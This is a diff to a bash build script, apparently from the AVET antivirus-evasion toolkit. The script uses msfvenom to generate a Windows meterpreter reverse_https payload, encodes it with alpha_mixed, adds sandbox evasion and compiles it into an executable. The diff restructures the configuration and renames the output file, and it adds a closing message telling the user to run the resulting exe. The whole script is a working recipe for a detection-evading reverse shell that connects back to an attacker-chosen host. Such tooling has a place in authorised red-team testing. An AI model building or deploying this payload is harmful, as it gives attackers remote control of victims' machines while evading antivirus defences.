@@ -1,5 +1,10 @@
 #!/bin/bash          
+
+
+#DESCRIPTION_START
 # Use metasploits alpha_mixed encoding
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -15,9 +20,18 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source none
+set_command_exec no_command
+# enable debug printing
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload, encoded with msf alpha_mixed 
 # additionaly to the avet encoder, further encoding should be used
@@ -25,10 +39,6 @@ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/a
 
 # add fopen sandbox evasion
 add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
-
-# no command preexec
-set_command_source none
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
@@ -43,12 +53,15 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode_ASCIIMSF
 
-# enable debug printing
-enable_debug_print
-
-# compile to output.exe file
-$win32_compiler -o output/output.exe source/avet.c
-strip output/output.exe
+# compile to exe file
+$win32_compiler -o output/asciimsf_revhttps_win32.exe source/avet.c
+strip output/asciimsf_revhttps_win32.exe
 
 # cleanup
 cleanup_techniques
+
+
+echo "
+# Execute the following command:
+# $ asciimsf_revhttps_win32.exe
+"
